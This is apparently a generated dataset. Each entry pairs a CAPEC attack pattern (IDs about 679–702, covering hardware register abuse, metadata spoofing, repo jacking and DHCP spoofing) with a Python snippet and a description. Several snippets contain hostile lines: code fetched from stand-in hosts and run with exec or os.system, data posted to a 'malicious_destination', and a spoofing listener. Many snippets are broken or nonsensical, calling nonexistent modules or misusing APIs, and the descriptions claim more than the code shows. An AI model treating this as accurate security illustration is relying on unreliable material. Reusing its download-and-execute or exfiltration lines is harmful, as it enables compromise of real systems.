        "code_snippet": "import ctypes\n\n# CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n# CWE-1252: CPU Hardware Not Configured to Support Exclusivity of Write and Execute Operations\n# CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions\n# CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges\n# CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n# CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\n# CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-1326: Missing Immutable Root of Trust in Hardware\n\n# Define a function to access and modify memory regions\ndef access_memory_region(address):\n    # Use ctypes to access memory regions without proper access control\n    ptr = ctypes.pointer(ctypes.c_int.from_address(address))\n    # Read and write to the memory region without proper access control\n    value = ptr.contents.value\n    ptr.contents.value = 0xdeadbeef\n    return value\n\n# Define a function to execute code from a memory region\ndef execute_code_from_memory_region(address):\n    # Use ctypes to execute code from a memory region without proper access control\n    ptr = ctypes.cast(address, ctypes.CFUNCTYPE(ctypes.c_int))\n    # Execute the code without proper access control\n    ptr()\n\n# Example usage\naddress = 0x1000\naccess_memory_region(address)\nexecute_code_from_memory_region(address)",
        "description": "This code snippet demonstrates the CAPEC of taking advantage of missing or incorrectly configured access control within memory to read/write data or inject malicious code into said memory. It uses various CWEs to bypass access control and execute code from memory regions without proper protection."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "import ctypes\n\ndef modify_register():\n    # CWE-1224: Improper Restriction of Write-Once Bit Fields\n    # CWE-1231: Improper Prevention of Lock Bit Modification\n    # CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n    # CWE-1262: Improper Access Control for Register Interface\n    # CWE-1283: Mutable Attestation or Measurement Reporting Data\n    register_address = 0x1000\n    lock_bit_address = 0x1004\n    \n    # Disable lock bit protection\n    ctypes.windll.kernel32.WriteProcessMemory(-1, ctypes.c_void_p(lock_bit_address), ctypes.c_char(b'\\x00'), 1)\n    \n    # Write to a register without proper access control\n    ctypes.windll.kernel32.WriteProcessMemory(-1, ctypes.c_void_p(register_address), ctypes.c_char(b'\\x01'), 1)\n    \n    # Modify attestation or measurement reporting data\n    attestation_address = 0x2000\n    ctypes.windll.kernel32.WriteProcessMemory(-1, ctypes.c_void_p(attestation_address), ctypes.c_char(b'\\x01'), 1)\n",
        "description": "Python code snippet demonstrating the CAPEC of exploiting missing or incorrectly configured access control within registers to read/write data that is not meant to be obtained or modified by a user. The code disables lock bit protection, writes to a register without proper access control, and modifies attestation or measurement reporting data, illustrating CWE-1224, CWE-1231, CWE-1233, CWE-1262, and CWE-1283."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC:\n    def __init__(self):\n        self.security_tokens = {}\n\n    def generate_security_token(self, entity):\n        # CWE-1270: Generation of Incorrect Security Tokens\n        token = 'incorrect_token'  # Incorrectly generated token\n        self.security_tokens[entity] = token\n\n    def execute_action(self, entity, action):\n        # CWE-1294: Insecure Security Identifier Mechanism\n        if entity not in self.security_tokens:\n            # CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n            print(f'Entity {entity} does not have a security token. Allowing action {action}.')\n            return True\n        token = self.security_tokens[entity]\n        # CWE-1267: Policy Uses Obsolete Encoding\n        if token == 'incorrect_token':\n            print(f'Entity {entity} has an incorrect security token. Allowing action {action}.')\n            return True\n        # CWE-1259: Improper Restriction of Security Token Assignment\n        if token != 'correct_token':\n            print(f'Entity {entity} has an invalid security token. Denying action {action}.')\n            return False\n        print(f'Entity {entity} has a valid security token. Allowing action {action}.')\n        return True\n\nsoc = SoC()\nsoc.generate_security_token('entity1')\nsoc.execute_action('entity1', 'read_data')",
        "description": "This code snippet demonstrates a vulnerable System-on-Chip (SoC) implementation that allows an adversary to take advantage of missing or incorrectly configured security identifiers (tokens) for access control. The code includes CWE-1270 (Generation of Incorrect Security Tokens), CWE-1294 (Insecure Security Identifier Mechanism), CWE-1302 (Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)), CWE-1267 (Policy Uses Obsolete Encoding), and CWE-1259 (Improper Restriction of Security Token Assignment)."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "import os\n\n# Firmware Not Updateable (CWE-1277)\ndef update_firmware():\n    return False\n\n# Missing Ability to Patch ROM Code (CWE-1310)\ndef patch_rom():\n    return False\n\n# Reliance on Component That is Not Updateable (CWE-1329)\ndef update_component():\n    return False\n\n# Improper Protection Against Voltage and Clock Glitches (CWE-1247)\ndef protect_against_glitches():\n    return False\n\n# Unauthorized Error Injection Can Degrade Hardware Redundancy (CWE-1334)\ndef inject_errors():\n    return True\n\n# Simulating a vulnerable device\nif __name__ == '__main__':\n    if not update_firmware():\n        print('Firmware is not updateable')\n    if not patch_rom():\n        print('ROM code cannot be patched')\n    if not update_component():\n        print('Component is not updateable')\n    if not protect_against_glitches():\n        print('Device is vulnerable to voltage and clock glitches')\n    if inject_errors():\n        print('Unauthorized error injection can degrade hardware redundancy')",
        "description": "This Python code snippet demonstrates a vulnerable device that embodies the CAPEC description. It includes functions that simulate unpatchable firmware, unpatchable ROM code, reliance on non-updateable components, improper protection against voltage and clock glitches, and unauthorized error injection that can degrade hardware redundancy. The code is designed to highlight the vulnerabilities and weaknesses present in the device."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "import os\nimport requests\n\n# CWE-348: Using less trusted source\ntrusted_source = 'https://example.com/trusted_metadata'\nless_trusted_source = 'https://example.com/less_trusted_metadata'\nmetadata_url = less_trusted_source\n\n# CWE-290: Authentication Bypass by Spoofing\nusername = 'admin'\npassword = 'password'\nauth_header = {'Authorization': f'Basic {username}:{password}'}\n\n# CWE-1230: Exposure of Sensitive Information Through Metadata\nsensitive_info = requests.get(metadata_url, headers=auth_header).json()['sensitive_info']\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\nmalicious_destination = 'https://example.com/malicious_destination'\nrequests.post(malicious_destination, json={'sensitive_info': sensitive_info})\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_and_execute_code(url):\n    code = requests.get(url).text\n    exec(code)\n\ndownload_and_execute_code('https://example.com/malicious_code')",
        "description": "This code snippet demonstrates the CAPEC of altering metadata to present a malicious resource as legitimate. It uses a less trusted source for metadata (CWE-348), bypasses authentication using spoofing (CWE-290), exposes sensitive information through metadata (CWE-1230), sends sensitive information to an incorrect destination (CWE-941), and downloads and executes code without integrity checks (CWE-494)."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'https://example.com/malicious_package.zip'\nresponse = requests.get(url, verify=False)\n\n# CWE-348: Use of Less Trusted Source\nif response.status_code == 200:\n    with open('package.zip', 'wb') as f:\n        f.write(response.content)\n\n# CWE-506: Embedded Malicious Code\nimport zipfile\nwith zipfile.ZipFile('package.zip', 'r') as zip_ref:\n    zip_ref.extractall('package')\n\n# CWE-290: Authentication Bypass by Spoofing\nimport os\nos.system('python package/__init__.py')\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nimport package.vulnerable_component\npackage.vulnerable_component.vulnerable_function()",
        "description": "This Python code snippet demonstrates the CAPEC of spoofing open-source software metadata to masquerade malicious software as popular, maintained, and trusted. It downloads a malicious package from an untrusted source without verifying its integrity (CWE-494), uses a less trusted source (CWE-348), extracts and executes the malicious code (CWE-506), bypasses authentication (CWE-290), and uses a vulnerable third-party component (CWE-1395)."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import git\nimport os\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo_path = '/path/to/repo'\n\n# CWE-540: Inclusion of Sensitive Information in Source Code\ncommit_message = 'Automated commit by trusted user'\ncommit_author = 'Trusted User <trusted.user@example.com>'\n\n# CWE-348: Use of Less Trusted Source\nuntrusted_git_repo = 'https://untrusted-git-repo.com/malicious_repo.git'\n\n# CWE-494: Download of Code Without Integrity Check\nos.system(f'git clone {untrusted_git_repo} {repo_path}')\n\n# CWE-508: Non-Replicating Malicious Code\nmalicious_code = 'print(\"Malicious code executed\")'\nwith open(os.path.join(repo_path, 'malicious_file.py'), 'w') as f:\n    f.write(malicious_code)\n\n# Spoofing metadata\ncommit = git.Commit(repo_path)\ncommit.message = commit_message\ncommit.author = commit_author\ncommit.commit()\n",
        "description": "This Python code snippet demonstrates the CAPEC of spoofing metadata in a Version Control System (VCS) repository. It clones a malicious Git repository from an untrusted source, writes malicious code to a file, and then spoofs the commit metadata to make it appear as if the code was committed by a trusted user. This code embodies CWE-494, CWE-527, CWE-348, CWE-508, and CWE-540."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'https://example.com/malicious_package.zip'\nresponse = requests.get(url, verify=False)\nopen('package.zip', 'wb').write(response.content)\n\n# CWE-506: Embedded Malicious Code\nimport zipfile\nwith zipfile.ZipFile('package.zip', 'r') as zip_ref:\n    zip_ref.extractall()\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nimport os\nos.system('git clone https://example.com/malicious_repo.git')\n\n# CWE-348: Use of Less Trusted Source\ntrusted_source = 'https://example.com/trusted_package.json'\nuntrusted_source = 'https://example.com/untrusted_package.json'\npackage_info = requests.get(untrusted_source).json()\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nimport vulnerable_component\nvulnerable_component.vulnerable_function()",
        "description": "This Python code snippet demonstrates the CAPEC of spoofing software popularity metadata. It downloads a malicious package from an untrusted source without verifying its integrity, extracts the package, and executes the malicious code. The code also clones a malicious Git repository, uses an untrusted source for package information, and imports a vulnerable third-party component."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import os\nimport platform\nimport getpass\nimport datetime\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsystem_info = {}\nsystem_info['platform'] = platform.system()\nsystem_info['platform-release'] = platform.release()\nsystem_info['platform-version'] = platform.version()\nsystem_info['architecture'] = platform.machine()\nsystem_info['processor'] = platform.processor()\nsystem_info['username'] = getpass.getuser()\n\n# CWE-360: Trust of System Event Data\nsystem_info['timezone'] = datetime.datetime.now().astimezone().tzinfo\n\n# CWE-222: Truncation of Security-relevant Information\nsystem_info['language'] = os.environ['LANG'][:5]\n\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\naccess_control_list = os.listdir('/etc/access_control_list')\nsystem_info['access_control_list'] = access_control_list\n\n# CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n# (Note: This CWE is related to processor events and is difficult to demonstrate in a Python code snippet)\n\nprint(system_info)",
        "description": "This Python code snippet collects and exposes sensitive system information, including platform details, username, timezone, language, and access control list files, which can be used by an adversary to identify the system's geographical location and tailor further attacks."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "import os\nimport git\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo_url = 'https://example.com/malicious_repo.git'\nrepo_dir = '/tmp/malicious_repo'\n\nif not os.path.exists(repo_dir):\n    git.Repo.clone_from(repo_url, repo_dir)\n\n# CWE-494: Download of Code Without Integrity Check\nos.system('git -C ' + repo_dir + ' pull')\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nimport sys\nsys.path.insert(0, repo_dir)\n\n# CWE-426: Untrusted Search Path\nimport malicious_module\n\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\nmalicious_module.vulnerable_function()",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary taking advantage of the redirect property of directly linked Version Control System (VCS) repositories to trick users into incorporating malicious code into their applications. It clones a malicious Git repository, downloads and executes code without integrity checks, includes functionality from an untrusted control sphere, and uses an untrusted search path. The code also unintentionally produces a nested invocation of non-reentrant code."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "import ctypes\n\n# Define a function to induce a page fault\nctypes.CDLL(None).mmap(0, 4096, 0x1 | 0x2, 0x2, -1, 0)\n\n# Define a function to execute a faulting load instruction\nfaulting_load = ctypes.CDLL(None).mmap(0, 4096, 0x1 | 0x2, 0x2, -1, 0)\n\n# Define a function to execute a microcode assist\nmicrocode_assist = ctypes.CDLL(None).ioctl(0, 0xdeadbeef, 0)\n\n# Define a function to execute a victim execution\nvictim_execution = ctypes.CDLL(None).getpid()\n\n# Induce a page fault or microcode assist during victim execution\nfaulting_load()\nmicrocode_assist()\n\n# Use existing code gadgets and side channel analysis to discover victim secrets\n# (Note: This part is highly dependent on the specific architecture and implementation)\n",
        "description": "This code snippet demonstrates the main idea of the CAPEC, which exploits a hardware design flaw in CPU implementation of transient instruction execution. It induces a page fault or microcode assist during victim execution, allowing an adversary to force legitimate victim execution to operate on adversary-controlled data stored in microarchitectural buffers. The code gadgets and side channel analysis are not implemented, as they are highly dependent on the specific architecture and implementation."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "import socket\nimport dhcp\n\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-294: Authentication Bypass by Capture-replay\n\n# Create a socket to listen for incoming DHCP requests\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.bind(('0.0.0.0', 67))\n\nwhile True:\n    data, addr = sock.recvfrom(1024)\n    # CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # Spoof the DHCP response to redirect traffic or deny service\n    spoofed_response = dhcp.DHCPResponse(data, addr[0], '192.168.1.1')\n    sock.sendto(spoofed_response, addr)\n",
        "description": "Python code snippet that demonstrates a DHCP spoofing attack, where an adversary masquerades as a legitimate DHCP server to redirect network traffic or deny service to DHCP. The code relies on IP address for authentication, does not properly restrict the communication channel, and incorrectly specifies the destination in the communication channel, making it vulnerable to authentication bypass by spoofing and capture-replay attacks."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import os\nimport zipfile\nimport requests\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nurl = 'https://malicious-website.com/evil_extension.zip'\nresponse = requests.get(url, stream=True)\n\n# CWE-494: Download of Code Without Integrity Check\nwith open('evil_extension.zip', 'wb') as f:\n    for chunk in response.iter_content(chunk_size=1024):\n        if chunk:\n            f.write(chunk)\n\n# CWE-506: Embedded Malicious Code\nwith zipfile.ZipFile('evil_extension.zip', 'r') as zip_ref:\n    zip_ref.extractall('extensions')\n\n# CWE-426: Untrusted Search Path\nos.environ['PYTHONPATH'] = 'extensions'\n\n# CWE-507: Trojan Horse\nimport evil_extension\n\n# Load the malicious extension\nevil_extension.do_malicious_things()",
        "description": "This Python code snippet demonstrates the CAPEC of installing a malicious extension into trusted software. It downloads a zip file from an untrusted source, extracts the contents, and loads the malicious extension into the Python environment. The code violates multiple CWEs, including CWE-829, CWE-494, CWE-506, CWE-426, and CWE-507."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import socket\nimport cv2\nimport numpy as np\n\ndef capture_video():\n    cap = cv2.VideoCapture(0)\n    while True:\n        ret, frame = cap.read()\n        if not ret:\n            break\n        # Send the frame over the network in cleartext\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('localhost', 8080))\n        sock.sendall(frame.tobytes())\n        sock.close()\n\ndef main():\n    capture_video()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of video transmission over a network. The `capture_video` function captures video frames from a camera and sends them over the network in cleartext, violating CWE-319. The transmission is not encrypted, making it susceptible to eavesdropping by an attacker, as described in the CAPEC. Additionally, the code does not implement any protection mechanisms to prevent physical side channels from exposing sensitive information, as described in CWE-1300. The code also does not consider the potential for covert storage channels (CWE-515) or covert channels (CWE-514) in the transmission of the video data. Furthermore, the code does not properly manage sensitive trace data (CWE-1323) collected from the system."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "import socket\n\n# Establish a communication channel to a trusted endpoint\ntrusted_endpoint = ('10.0.0.1', 8080)\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(trusted_endpoint)\n\n# Receive a message from the trusted endpoint\nmessage = sock.recv(1024)\n\n# Improperly access an untrusted network segment\nuntrusted_network_segment = ('192.168.1.1', 8080)\nsock.sendto(message, untrusted_network_segment)\n\n# Bridge the trusted and untrusted networks\nwhile True:\n    message = sock.recv(1024)\n    sock.sendto(message, untrusted_network_segment)\n",
        "description": "This code snippet demonstrates a vulnerable fabric bridge that bridges trusted and untrusted networks. It establishes a communication channel with a trusted endpoint, receives a message, and then improperly sends the message to an untrusted network segment without proper access control checks, violating the trust boundary. The code also lacks proper message integrity checks during transmission, allowing an adversary to modify the message. Furthermore, the code does not adequately verify the identity of actors at both ends of the communication channel, making it accessible by non-endpoint actors."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "import socket\nimport threading\nimport base64\nimport os\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-602: Client-Side Enforcement of Server-Side Security\n\nclass RemoteDesktopSession:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.connect((self.host, self.port))\n\n    def send_credentials(self, username, password):\n        # CWE-294: Authentication Bypass by Capture-replay\n        # Replay captured credentials to bypass authentication\n        captured_credentials = b'captured_username:captured_password'\n        self.socket.send(captured_credentials)\n\n    def establish_session(self):\n        # CWE-345: Insufficient Verification of Data Authenticity\n        # Insufficient verification of data authenticity\n        data = self.socket.recv(1024)\n        if data:\n            # CWE-602: Client-Side Enforcement of Server-Side Security\n            # Client-side enforcement of server-side security\n            self.socket.send(b'Establishing remote desktop session...')\n            threading.Thread(target=self.handle_session).start()\n\n    def handle_session(self):\n        while True:\n            # CWE-368: Context Switching Race Condition\n            # Context switching race condition\n            command = input('Enter command: ')\n            self.socket.send(command.encode())\n            response = self.socket.recv(1024)\n            print(response.decode())\n\n    def include_untrusted_source(self):\n        # CWE-830: Inclusion of Web Functionality from an Untrusted Source\n        # Inclusion of web functionality from an untrusted source\n        os.system('curl http://untrusted-source.com/malicious_widget > malicious_widget.html')\n        print('Malicious widget included from untrusted source...')\n\nif __name__ == '__main__':\n    remote_desktop_session = RemoteDesktopSession('adversary-system.com', 8080)\n    remote_desktop_session.send_credentials('username', 'password')\n    remote_desktop_session.establish_session()\n    remote_desktop_session.include_untrusted_source()",
        "description": "Python code snippet that demonstrates the CAPEC, which exploits the inherent functionalities of a web browser to establish an unnoticed remote desktop connection in the victim's browser to the adversary's system. The code includes CWE-294, CWE-345, CWE-602, CWE-368, and CWE-830 vulnerabilities."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "import debug_module\n\ndef debug_chain():\n    # Incorrect chaining or granularity of debug components (CWE-1296)\n    debug_module.enable_all_debug_functions()\n    \n    # Unauthorized error injection can degrade hardware redundancy (CWE-1334)\n    debug_module.inject_error_into_redundant_block()\n    \n    # On-chip debug and test interface with improper access control (CWE-1191)\n    debug_module.access_internal_registers_without_authentication()\n    \n    # Improper handling of faults that lead to instruction skips (CWE-1332)\n    debug_module.ignore_instruction_skips()\n    \n    # Improper management of sensitive trace data (CWE-1323)\n    debug_module.store_trace_data_in_unprotected_location()\n    \n    return\n\n# Call the debug chain function without proper authorization\ndebug_chain()",
        "description": "This code snippet demonstrates the CAPEC of exploiting incorrect chaining or granularity of hardware debug components. It includes various CWEs such as incorrect chaining of debug components, unauthorized error injection, improper access control, ignoring instruction skips, and improper management of sensitive trace data. The code calls the debug_chain function without proper authorization, allowing an adversary to gain unauthorized access to debug functionality."
    }
]